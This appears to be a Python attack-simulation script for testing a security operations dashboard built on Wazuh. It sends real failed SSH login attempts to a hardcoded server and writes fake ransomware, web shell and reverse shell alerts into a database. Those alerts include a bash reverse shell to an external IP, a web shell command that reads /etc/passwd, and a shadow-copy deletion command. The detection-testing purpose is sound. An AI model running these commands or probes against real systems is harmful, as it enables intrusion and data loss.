"""
Attack & Malware Simulator — SENTINEL AI SOC
Test both Real Live Attacks on the Wazuh Server and Advanced Malware Scenarios.
Usage:
    python attack_simulator.py --type real-ssh
    python attack_simulator.py --type ransomware
    python attack_simulator.py --type webshell
    python attack_simulator.py --type reverse-shell
"""
from __future__ import annotations
import argparse
import json
import os
import subprocess
import sys
import time
from datetime import datetime, timezone
import uuid

# Ensure backend modules can be imported
sys.path.insert(0, os.path.dirname(__file__))

from backend.db.session import SessionLocal
from backend.db.models import Alert
from backend.processing.correlate import add_to_or_create_incident
from backend.processing.deduplicate import insert_alert_if_new
from backend.schemas.alert import NormalizedAlert
from backend.processing.fingerprint import build_fingerprint
from backend.config import get_settings


def run_live_ssh_attack(target_ip: str = "13.60.94.139", attempts: int = 5):
    """
    Fires real failed authentication attempts against the Wazuh AWS server.
    This triggers Wazuh's real internal sshd rules (5716 / 5710) live on agent 000!
    """
    print(f"\n[+] [ATTACK] Launching REAL Live SSH Brute-Force probe against Wazuh Server ({target_ip})...")
    fake_users = ["hacker_root", "bot_admin", "evil_user", "malware_dropper", "shadow_user"]
    
    for i in range(min(attempts, len(fake_users))):
        u = fake_users[i]
        print(f"    [-] Attempt {i+1}/{attempts}: Trying invalid credentials for user '{u}'...")
        try:
            cmd = [
                "ssh",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=NUL",
                "-o", "ConnectTimeout=3",
                "-o", "BatchMode=yes",
                f"{u}@{target_ip}"
            ]
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass
        time.sleep(0.5)

    print(f"\n[OK] Live attack traffic sent to {target_ip}!")
    print("[*] Wazuh Agent 000 on AWS is now generating real security alerts in /var/log/auth.log.")
    print("[*] Running ingestion now to capture it into your app...\n")

    time.sleep(2)
    from backend.ingest import run_ingestion
    result = run_ingestion()
    print("[+] Ingestion Completed:", json.dumps(result, indent=2))


def inject_malware_attack(scenario: str):
    """
    Simulates a high-severity malware infection (Ransomware, Web Shell, Reverse Shell)
    with full forensic metadata and MITRE ATT&CK correlation.
    """
    db = SessionLocal()
    settings = get_settings()
    now = datetime.now(timezone.utc)
    attack_id = uuid.uuid4().hex[:8]

    scenarios = {
        "ransomware": {
            "rule_id": "18107",
            "rule_level": 14,
            "severity": "critical",
            "rule_description": "Ransomware Detected: High-frequency encrypted file writes (.lockbit extension)",
            "agent_name": "finance-fs01",
            "agent_ip": "10.0.4.15",
            "src_ip": "10.0.4.15",
            "src_user": "corp\\j_smith",
            "location": "syscheck: /shared/finance_records/",
            "decoder": "syscheck_integrity",
            "mitre_techniques": ["T1486", "T1027", "T1489"],
            "groups": ["ransomware", "file_integrity", "syscheck"],
            "full_log": "Syscheck integrity failure: 4,820 files renamed to *.lockbit within 45 seconds. Ransom note README_RESTORE_FILES.txt dropped.",
            "raw_json": {
                "malware_family": "LockBit 3.0",
                "encrypted_files_sample": ["/shared/finance_records/Q3_Audit.xlsx.lockbit", "/shared/finance_records/Payroll.db.lockbit"],
                "process_name": "vssadmin.exe delete shadows /all /quiet",
                "ioc_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
            }
        },
        "webshell": {
            "rule_id": "31103",
            "rule_level": 12,
            "severity": "critical",
            "rule_description": "Web Shell Execution: Suspicious PHP backdoor invoked with cmd=whoami",
            "agent_name": "web-prod-01",
            "agent_ip": "10.0.1.20",
            "src_ip": "194.26.29.112",
            "src_user": "www-data",
            "location": "/var/log/nginx/access.log",
            "decoder": "web-accesslog",
            "mitre_techniques": ["T1505.003", "T1059.004"],
            "groups": ["web", "backdoor", "attack"],
            "full_log": '194.26.29.112 - - [POST /wp-content/uploads/c99.php?cmd=cat+/etc/passwd HTTP/1.1] 200 4520 "-" "curl/7.68.0"',
            "raw_json": {
                "uri": "/wp-content/uploads/c99.php",
                "http_method": "POST",
                "injected_command": "cat /etc/passwd",
                "attacker_user_agent": "curl/7.68.0"
            }
        },
        "reverse-shell": {
            "rule_id": "60115",
            "rule_level": 13,
            "severity": "critical",
            "rule_description": "Active C2 Beacon: Bash interactive reverse TCP socket to external IP",
            "agent_name": "db-cluster-01",
            "agent_ip": "10.0.2.10",
            "src_ip": "185.220.101.5",
            "src_user": "postgres",
            "location": "auditd",
            "decoder": "auditd",
            "mitre_techniques": ["T1059.004", "T1071.001", "T1095"],
            "groups": ["execution", "command_and_control", "auditd"],
            "full_log": "auditd: execve(/bin/bash -i >& /dev/tcp/185.220.101.5/4444 0>&1) executed by uid=105(postgres)",
            "raw_json": {
                "c2_server": "185.220.101.5:4444",
                "process": "/bin/bash",
                "pid": 28419,
                "parent_pid": 1102
            }
        }
    }

    if scenario not in scenarios:
        print(f"[!] Unknown scenario: {scenario}. Available: {list(scenarios.keys())}")
        return

    data = scenarios[scenario]
    source_name = "wazuh_aws"
    source_alert_id = f"malware-{scenario}-{attack_id}"

    norm = NormalizedAlert(
        source_name=source_name,
        source_alert_id=source_alert_id,
        timestamp=now,
        agent_id=f"agent-{scenario[:3]}",
        agent_name=data["agent_name"],
        agent_ip=data["agent_ip"],
        rule_id=data["rule_id"],
        rule_level=data["rule_level"],
        severity=data["severity"],
        rule_description=data["rule_description"],
        src_ip=data["src_ip"],
        dst_ip=data["agent_ip"],
        src_user=data["src_user"],
        dst_user=None,
        groups=data["groups"],
        mitre_techniques=data["mitre_techniques"],
        location=data["location"],
        decoder=data["decoder"],
        full_log=data["full_log"],
        raw_json=data["raw_json"],
        fingerprint=build_fingerprint(source_name, source_alert_id)
    )

    print(f"\n[+] [MALWARE SIMULATION] [{scenario.upper()}]...")
    print(f"    [-] Threat: {data['rule_description']}")
    print(f"    [-] Target: {data['agent_name']} ({data['agent_ip']})")
    print(f"    [-] MITRE Techniques: {data['mitre_techniques']}")

    row, is_new = insert_alert_if_new(db, norm)
    if is_new:
        incident = add_to_or_create_incident(db, row, settings.correlation_window_minutes)
        print(f"\n[OK] SUCCESS: Alert successfully stored in Database (Alert ID: {row.id})!")
        print(f"[OK] Incident Created / Correlated: Incident #{incident.id} - '{incident.title}'")
        print("\n[*] Now open your Streamlit Dashboard (http://localhost:8501):")
        print(f"    1. View '2. Alerts Explorer' -> Look for '{data['rule_description'][:40]}...'")
        print(f"    2. View '3. Incidents' -> Click Incident #{incident.id}")
        print("    3. View '5. AI Analyst Studio' -> Run AI Triage & Root Cause Analysis with Groq LLM!")
    else:
        print("[!] Alert was identified as duplicate and skipped.")

    db.close()


def main():
    parser = argparse.ArgumentParser(description="SENTINEL AI Attack & Malware Simulator")
    parser.add_argument(
        "--type",
        choices=["real-ssh", "ransomware", "webshell", "reverse-shell"],
        default="real-ssh",
        help="Type of attack to execute (default: real-ssh)"
    )
    args = parser.parse_args()

    if args.type == "real-ssh":
        run_live_ssh_attack()
    else:
        inject_malware_attack(args.type)


if __name__ == "__main__":
    main()
